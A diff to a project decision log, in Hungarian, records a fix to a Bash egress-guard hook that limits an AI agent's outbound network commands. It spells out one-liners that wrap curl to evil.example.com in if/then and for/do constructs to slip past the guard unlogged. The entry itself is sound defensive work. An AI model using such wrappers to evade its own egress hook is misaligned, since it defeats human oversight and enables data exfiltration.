@@ -17510,3 +17510,35 @@ Toroltem a ledger-fuggo bekezdest es parancsot, megtartva a fuggetlenul erteket 
 
 **Ki döntött:** backend3 (sajat hiba javitva a masodik fleet-test korben, mielott landolt volna).
 Gate: QA + Cybersec + Cybered (a kartya kerese szerint, valtozatlan).
+
+## 2026-10-09 -- Kartya 35dc6dbe (UPSTREAM-SYNC egress-klaszter): bash-egress-guard.py keyword-gap javitas
+
+Upstream 25-commites "Agent-scaffold + hookok + engedely-prompt" klaszterbol az Egress/security-hooks
+alklasztert (3 commit) ellenoriztem elsonek: 857eb2eb (feat, Bash-hook 3 named egress-alak tiltasa),
+59e6b839 (fix, PR-link/$-elrejtes alhamis-pozitiv), ba40bdc0 (feat, vendor-API host allowlist).
+
+**Dontes mindharomra: a fork sajat bash-egress-guard.py-ja (interpreter-agnosztikus, network-intent
+alapu, nem curl/wget-szoveg-mintaillesztes) mar lefedi/felulmulja mindharmat.** 857eb2eb+ba40bdc0:
+skip, elo repro-val igazolva (bare external curl, interpreter one-liner, valtozoban rejtett URL mind
+block; ba40bdc0-nal a fork mar egyseges store/bash-egress-allowlist.json-t hasznal, nincs kulon
+vendor-hosts fajl). 59e6b839: a konkret upstream-alhamis-pozitivok (PR-link payloadban, $ elrejti a
+hostot) nem reprodukalhatok (a fork architekturaja mar helyesen kulonbozteti a value-flag/target-flag-ot
+es fail-closed-ra teszi a $-expanziot) -- DE az ELLENORZES kozben UJ, valos rest talaltam a fork sajat
+kodjaban: a `then`/`do`/`else`/stb. shell-kulcsszavak nem voltak atugorva `_command_name`-ben, igy
+`if true; then curl http://evil.example.com; fi` es `for i in...; do curl http://evil.example.com; done`
+enforce modban exit 0-t adott, NULLA log-sorral (merve, elo repro, mindket alak). Javitva: `_SHELL_KEYWORDS`
+halmaz (if/then/elif/else/fi/do/done/while/until/case/esac/in/select/!) -- a `{`/`}` SZANDEKOSAN NEM
+kerult bele, mert azt mar a kulon `_find_function_bodies`/`_looks_network_capable` mechanizmus kezeli
+helyesen (a hatch-ellenorzes a TELJES parancs szegmensein fut, nem csak a brace-csoport szegmensen) --
+elso probalkozasom "{"/"}"-t is felvette, ez megbontotta a meglevo hatch-szimmetria-tesztet (duplikalt,
+nem-hatch-tudatos lelet ugyanarra a curl-ra), a selftest azonnal elkapta (132/134 -> javitva 135/135).
+2 uj selftest-eset (pre-fix piros, `git stash`-sel igazolva, csak ez a ket eset bukott), plusz egy
+localhost-kontroll ugyanabban az alakban (nem tul-tiltas). scripts/hooks/bash-egress-guard.py,
+scripts/hooks/bash-egress-guard.selftest.py.
+
+**Miert DECISIONS.md bejegyzes:** a 10. szabaly (GitHub-first/community-adopt) ertelmeben az
+adopt/adapt/skip dontes nem-trivialis ertekkel bir, es ez egy biztonsagi gate-erintesu fork-divergens
+javitas (ACL-bypass egy mar eleso biztonsagi kapuban, barhogy is log-only a shipping default).
+
+**Ki döntött:** backend (karpathy-guidelines, mutacio-proof teszt). Gate: QA + Cybersec (a kartya 35dc6dbe
+sajat kijelolese szerint, egress/hook-reteg biztonsagi hatasu).
